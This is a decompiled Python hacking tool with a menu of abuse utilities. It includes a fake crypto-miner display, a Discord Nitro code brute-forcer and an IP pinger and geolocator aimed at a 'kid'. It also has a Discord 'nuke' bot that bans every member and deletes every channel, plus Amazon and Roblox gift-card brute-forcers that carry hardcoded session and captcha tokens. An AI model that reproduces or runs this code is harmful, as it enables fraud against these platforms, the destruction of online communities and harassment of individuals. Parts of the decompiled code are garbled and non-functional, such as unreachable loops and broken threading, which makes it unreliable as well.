# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: c:\Users\User\Desktop\ScytheTool Package\SigmaTool.py
# Bytecode version: 3.9.0beta5 (3425)
# Source timestamp: 2022-06-11 06:08:53 UTC (1654927733)

import os
from pickle import REDUCE
import random
from secrets import choice
import string
from tabnanny import verbose
import time
from http import client
import keyboard
import requests
from pystyle import Colorate, Colors, Write
f = open('Valid Nitro.txt', 'w', encoding='utf-8')
import cmd
import os
import platform
import subprocess
import sys
import sys as n
import threading
import time as mm
import webbrowser
from concurrent.futures import thread
from os import system
from typing import List
import discord
import keyboard
import mouse
import pyautogui
import pydirectinput
import pystyle
from colorama import Back, Fore, Style
from discord.ext import commands
from pynput.keyboard import KeyCode, Listener
from pynput.mouse import Button, Controller
from pystyle import Colorate, Colors, Write
from tkinter import *
from pythonping import ping
from subprocess import call
os.system('cls')
banner = Fore.GREEN + '\n  ██████   ██   ▄████   ███▄ ▄███▓ ▄▄▄     \n▒██    ▒ ▒▓██▒ ██▒ ▀█▒ ▓██▒▀█▀ ██▒▒████▄   \n░ ▓██▄   ░▒██░▒██░▄▄▄░ ▓██    ▓██░▒██  ▀█▄ \n  ▒   ██▒ ░██░░▓█  ██▓ ▒██    ▒██ ░██▄▄▄▄██\n▒██████▒▒ ░██░▒▓███▀▒░▒▒██▒   ░██▒ ▓█   ▓██\n▒ ▒▓▒ ▒ ░ ░▓  ░▒   ▒  ░░ ▒░   ░  ░ ▒▒   ▓▒█\n░ ░▒  ░    ▒   ░   ░  ░░  ░      ░  ░   ▒▒ \n░  ░  ░    ▒ ░ ░   ░ ░ ░      ░     ░   ▒  \n      ░    ░       ░  ░       ░         ░  \n' + Fore.GREEN
print(banner)
print('')
print(Colorate.Horizontal(Colors.blue_to_purple, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [1] RULES (READ)          |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃                                                                                                                      ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [2] Fake ETH Miner        |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [3] Nitro Gen Improved    |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [4] IP Pinger Improved    |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [5] IP Tracer Improved    |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [6] Discord Nuker Bot     |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃ [7] Multi Gift Card Gen   |                                                                                          ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '┃                                                                                                                      ┃', 1))
print(Colorate.Horizontal(Colors.blue_to_purple, '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 1))

def g(rolls):
    data = 'qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM'
    result = ''
    while rolls >= 1:
        c = random.choice(data)
        result = c + result
        rolls = rolls - 1
    return result
Choice = int(input('[-->]: '))
Hotkey = input(Colorate.Horizontal(Colors.red_to_purple, 'What key on your keyboard do you want to use to start the programs?: '))
if Choice == 1:
    os.system('SigmaRules.py')
if Choice == 2:
    print(f'Press {Hotkey} to activate')
    while True:  # inserted
        print(Fore.WHITE + ' ---> ' + Fore.RED + '0.00000 ETH')
        time.sleep(0.1)
        if keyboard.is_pressed(Hotkey):
            print(Fore.WHITE + ' ---> ' + Fore.GREEN + '0.07239 ETH')
            time.sleep(5)
if Choice == 3:
    print(f'Press {Hotkey} to activate')
    thread_amount = int(input('How many threads do you want to use? '))
    used_threads = thread_amount * 1000000
    while True:  # inserted
        while keyboard.is_pressed(Hotkey):
            pass  # postinserted
    while True:  # inserted
        def generate():
            while True:  # inserted
                code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
                r = requests.get(f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true')
                if r.status_code == 200:
                    print(Fore.BLUE)
                    print(f'[+] Valid | discord.gift/{code}')
                    sys.write(f'discord.gift/{code}\n')
                    webbrowser.open('https://discord.gg/WdaZy28xkB%22')
                else:  # inserted
                    print(Fore.RED)
                    print(f'[-] Invalid | https://discord.gift/{code}')
        threads = []
        for i in range(thread_amount):
            t = threading.Thread(target=generate())
            t.daemon = False
            threads.append(t)
        for i in range(thread_amount):
            threads[i].start()
        for i in range(thread_amount):
            threads[i].join()
if Choice == 4:
    ip_list = input(Colorate.Horizontal(Colors.blue_to_purple, 'Enter kids IP: ', 1))
    pingtimes = int(input(Colorate.Horizontal(Colors.blue_to_purple, f'How many times do you want to ping {ip_list}?: ', 1)))
    response = os.popen(f'ping {ip_list}').read()
    if 'Received = 4' in response:
        for i in range(pingtimes):
            print(Colorate.Horizontal(Colors.purple_to_red, 'KID IS ONLINE'))
            time.sleep(0.1)
    else:  # inserted
        for i in range(pingtimes):
            print(Colorate.Horizontal(Colors.purple_to_red, 'KID IS OFFLINE'))
            time.sleep(0.1)
if Choice == 5:
    ip = str(input('Enter IP: '))
    response = requests.post('http://ip-api.com/batch', json=[{'query': str(ip)}]).json()
    for ip_info in response:
        for k, v in ip_info.items():
            print(k, v)
            print('\n \r')
        time.sleep(120)
if Choice == 6:
    Token = input('Discord Bot: ')
    owner = int(input('Enter your discord ID: '))
    print('Type ?nukeloser to nuke!')
    client = commands.Bot(command_prefix=commands.when_mentioned_or('?'), help_command=None)

    @client.event
    async def on_ready():
        print('Nuke Bot Is Ready to go!')

    @client.command()
    async def nuke(ctx):
        if ctx.author.id == owner:
            for member in ctx.guild.members:
                try:
                    if member == ctx.author:
                        pass
                    else:  # inserted
                        await member.ban()
                        await ctx.send(f'Successfully ban {member}')
                except Exception as e:
                    await ctx.send(f'Unable to ban {member} {e}')
            for chan in ctx.guild.channels:
                try:
                    await chan.delete()
                except:
                    pass
            await ctx.guild.create_text_channel('nuked')
            channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
            await channel.send('KABOOOM\ndiscord.gg/')
        else:  # inserted
            await ctx.send('No')
    client.run(Token)
if Choice == 7:
    print(Colorate.Horizontal(Colors.blue_to_purple, 'unknown\'s Sigma GiftCard Gen | Checker coming soon!'))
    print('')
    print(Colorate.Horizontal(Colors.blue_to_purple, 'What Giftcard would you like to generate?'))
    tt = input('\nAmazon\nRoblox\nFortnite\nEbay\nNetflix\niTunes\nPaypal\nPlaystation\nSteam\nXbox\nPlayStore\nMinecraft\n\n[-->]: ')
    t = tt.lower()
    print('')
    print(Colorate.Horizontal(Colors.blue_to_purple, 'How many codes would you like to generate?'))
    nn = input('[-->]: ')
    print('')
    n = int(nn)
    if t == 'minecraft':
        for x in range(n):
            print('')
            print(g(4) + '-' + g(4) + '-' + g(4))
    if t == 'paypal':
        for x in range(n):
            print('')
            print(g(4) + '-' + g(4) + '-' + g(4))
    if t == 'playstation':
        for x in range(n):
            print('')
            print(g(4) + '-' + g(4) + '-' + g(4))
    if t == 'amazon':
        gentypeamazon = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        fileamazon = ' Generated By Multipe Gift Card Generator.txt'
        urlamazon = 'https://www.amazon.com.au/payments-portal/data/f1/widgets2/v1/customer/A2HJVITSVV1FJG'
        thread_amountamazon = int(input('How many threads do you want to use? '))
        used_threadsamazon = thread_amountamazon * 1000000

        def generate():
            while True:  # inserted
                generate1 = random.choice(gentypeamazon)
                generate2 = random.choice(gentypeamazon)
                generate3 = random.choice(gentypeamazon)
                generate4 = random.choice(gentypeamazon)
                space1 = '-'
                generate5 = random.choice(gentypeamazon)
                generate6 = random.choice(gentypeamazon)
                generate7 = random.choice(gentypeamazon)
                generate8 = random.choice(gentypeamazon)
                generate9 = random.choice(gentypeamazon)
                generate10 = random.choice(gentypeamazon)
                space2 = '-'
                generate11 = random.choice(gentypeamazon)
                generate12 = random.choice(gentypeamazon)
                generate13 = random.choice(gentypeamazon)
                generate14 = random.choice(gentypeamazon)
                newline = '\n'
                final = generate1 + generate2 + generate3 + generate4 + space1 + generate5 + generate6 + generate7 + generate8 + generate9 + generate10 + space2 + generate11 + generate12 + generate13 + generate14 + newline
                data = {'ppw-claimCodeApplyPressed': 'Apply', 'ppw-jsEnabled': 'true', 'ppw-widgetState': '4-MS0Y6LOcZe223n9HdtShbFauht2pDwYldMTQhJHAAi8G_544jN7wK9nbMlxUNE0iOkzzsWBkeuG1wxUQB0E5Wj9i8VZC0iYnEHSYx2fAxEjEyTVijZQs8ix88OUoSrJ6yvOZY2MNM-5xyj6Vr90F4RWHNM22LBhjD-QnMcAYqmmnh2G4hF41-K-PWJYyAtDU1gQRQprU1Gd4__o5Hnw9ThXdkQtMvHPSpiZrCyrLc0kLUcShEXzppT66kFc-FK5cixnDwwQ3kamct4SV412R8F1bc-AygKzJFtpAmkz7qoJ8Lg10BiuedFmoV3pTmeb64lm5b1moWXTOsf7-aOVgw5AC3-SqJe2Io7HoaTI4JEZjZYAAnHnDMmWslYC5sPydwD7gkRf5bJj69dgqKxPlRE5S9gI2zC1bqi0gYbGDghzrPPRuaYzXYS9kQChxI1kW87wrfB6MhT8pdm_RcDWS4O0jQ2bVNicXLbvXtW6yoU4qumzkmrbfp_DDML4iyfoAXTEEkw7ctB9C6qPHfEMsLSFg7v7K2VIS4AxFW1e2MMicl97OASt_ADurqKuwAAO9SvjQYvKPXGKx5i5cSnx7SyuV5xxhrb7wzJlRN5pGyAagA9NMoxSTtD0qOsHzun98xaVYntQFVZJLWdC--RzngUhyU4VYjSsL7wD9BPI9rFE0KpYNwpG_VYGonBxvN2bvhUGXRH5RNZ_ol8rEXIakOaWjTaPtRwi_t1GPLJfWmJENERcbjXPgNWdCN4rGsYDUeQoV13JPciFEtdsCUzRRnbrLxHe4uaUQmkEQXZqjRjElWLBlbk9F9hPNLsJ2kyqk4I-ZdHXHdqC7Fsf3L5Vw-7QfkHT_6GFXKPgZMN-vvVuIIULEEtdJZS9z_VYBtC9qdUd0oNQVh0ZPZhH3I2JEAR9W4PiRbhohE97KmSPvNa9dWrim4aF-_0wQODfd0odbb2lH8og0c6C0-2YhNxLUQtBlT5y0gWQOLJIYCfmBbC8L8ML3odF6UO3EVCDeg6VAcs5cXEOgghtSRLE15-gdyBwndqk0gR6Id-k_5_EC2gtOGASbdn9hXe8QBb09wwkqwNuS8qjzb_8tY4cYa7mX3UZqU1sWWRt9so0dfLYh8pGc5nDstsXv7o4CbWq_E4yjOPjiiYt7K-RXaaN5SgfoOmkD0u4vorJ_3YoK78SAyHdZHIDYXFSzvVm6ZhZe2WNbAf27QVkHgSitcFH4-bmkFWEyAbAvBnhCTQWnjlLPB4ftvgdcbA-_5vUI64h9_ZWXrpZyA8bcFwqCRGW2hXjFmZC_p4e9ChXT-XyQQEKP_-htrU4uXP7IUoKCurg-QfKFxuo05bxNt9nvDrxG_VWIRje3OAdKRt2tvaaYha785RMtjYPGTv2NpoVWqpl4whZYqYtCkVnWjpDMqGzDY4qr7VtBkYtE7kYKkcjQFsf96jxLccZuNIqpfz0et7BCow7MNjAXXPcALdCMNxdNkSU_29uR5lmCPD-cUJdbq7CJbAR5c_DA3rkavKz8Ki7ExjWIS2ww1Ug582WHSF-6HwYddF32gN-8CzTBC-mt63NKKjWvBnDEwxX3hAKetvbgC1Fz5LHtgBryYbS1wGgPSR_kFfy-oISveKXO0apD2cY8dKK1Iq9-09SAHVb1lrTPBRFQgxAJeJvKimcCsJ65qPHViEOhih2dnUVpM1iFP_QhPKxIvOo2pMD_nyAdzKB_BN2EJisrPE6_4aaLqRa05J4y8UBt0wZrUph-u3iAfrMsoQfZ4qmlGqOI--nD1_UJSg_NXG4BkMU4mxg0WmOt5IapB53g4Vqt4NO-OptUc0uZCXtolOj2aJuERcejLul6BhpLMgCvaEXkRY6D33KdqKyj05l-GbJUPxKTjEl6fjdCSO6X68ZVmkBZ0KZ02WK3M1nk0xJi2S5HYzQZx6WNm6NpZStYuLcUUenAiqrPE-GTjZ_EQ8BPr8aSSF4QW71FQSAQ-cwAje2nzeskAW-ZK2VL5gAufy7XMkBrzPC7hfwAeA2UuTy83gj_vErC-phl7jIbhQpeOR9ydNjae_b0kiVM1PkXgp-YI_asCMTTv_ysrxanflGYW3r78Zi3b0y5oKuU3ahbY0eAVg7UB3Gsha4D51Db6ARec_Rj-lYsSNV9Sy58nJ56e3qOWm0jMzuLXHmMGYK2PH40JKZQkOhOgaxo_MnLXHC0NU3BIYbM7z7s-sQS8IisIGwdoeCaPF3sSmXQYBjmXvrqxOIOni5bfVIOumnL_ECi-kCxDw2P6bexSRgvMXo6d1A0DlfW06bbx39rLjjBrC5Nt0gevYj0612RUAvUALZkw2dHUn-aWWQAe-1FjFr0xSQVqq5tIj-LaBQFoEtEGo4g6C4gxlINSv9baPqw_zDTzeBswm_gDUeF-ZhvLSw0VEuCvDx1gAWaFs3M-jWdmh-Ejl0Wx-9ZmMHII7-0nq4M60rRnu8_H32-gxFQK3OQvnEy', 'ie': 'UTF-8', 'ppw-widgetEvent': 'ClaimAnyCodeEvent', 'ppw-claimCode': final}
                r = requests.post(urlamazon, data=data)
                if r.status_code == 200:
                    print(Fore.GREEN)
                    print(f'Valid | {final}')
                    with open(fileamazon, 'a') as out:
                        out.write('Valid | ' + generate1 + generate2 + generate3 + generate4 + space1 + generate5 + generate6 + generate7 + generate8 + generate9 + generate10 + space2 + generate11 + generate12 + generate13 + generate14 + newline)
                if r.status_code == 405:
                    print('Why you edit Code? It is like that for a reason, dumbass')
                else:  # inserted
                    print(Fore.RED)
                    print(f'Invalid | {final}')
                    with open(fileamazon, 'a') as out:
                        out.write('Invalid | ' + generate1 + generate2 + generate3 + generate4 + space1 + generate5 + generate6 + generate7 + generate8 + generate9 + generate10 + space2 + generate11 + generate12 + generate13 + generate14 + newline)
        threads = []
        for i in range(used_threadsamazon):
            t = threading.Thread(target=generate())
        for i in range(used_threadsamazon):
            threads[i].start()
            t.daemon = False
            t.append(t)
        for i in range(used_threadsamazon):
            threads[i].join()
    if t == 'playstore':
        for x in range(n):
            print('')
    if t == 'netflix':
        for x in range(n):
            print('')
            print(g(4) + '-' + g(6) + '-' + g(4))
    if t == 'steam':
        for x in range(n):
            print('')
            print(g(4) + '-' + g(6) + '-' + g(5))
    if t == 'fortnite':
        for x in range(n):
            print('')
            print(g(5) + '-' + g(4) + '-' + g(4))
    if t == 'roblox':
        thread_amountroblox, used_threadsroblox = int(input('How many threads do you want to use? '))

        def generate():
            while True:  # inserted
                ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                ran1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                ran2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                ran3 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
                final = 'RI-' + ran + ran1 + ran2 + ran3
                url = 'https://billing.roblox.com/v1/gamecard/redeem/'
                data = {'captchaId': 'DMsPiHkSQmgegrq4VA99Z', 'captchaProvider': 'PROVIDER_ARKOSE_LABS', 'captchaToken': '426274c63f17e480.4747946801|r=us-east-1|metabgclr=transparent|guitextcolor=%23474747|maintxtclr=%23b8b8b8|metaiconclr=%23757575|meta=3|lang=en|pk=1B154715-ACB4-2706-19ED-0DC7E3F7D855|at=40|sup=1|rid=84|ag=101|cdn_url=https%3A%2F%2Froblox-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-us-east-1.arkoselabs.com|surl=https%3A%2F%2Froblox-api.arkoselabs.com', 'pinCode': final}
                r = requests.post(url, data=data)
                if r.status_code == 200:
                    print(Fore.GREEN)
                    print(f'Valid | {final}')
                if r.status_code == 405:
                    print('Why you edit Code? It is like that for a reason, dumbass')
                else:  # inserted
                    print(Fore.RED)
                    print(f'Invalid | {final}')
        threadsroblox = []

        threadsroblox = []

for i in range(used_threadsroblox):
    t = threading.Thread(target=generate)
    t.daemon = False
    threadsroblox.append(t)

for t in threadsroblox:
    t.start()

for t in threadsroblox:
    t.join()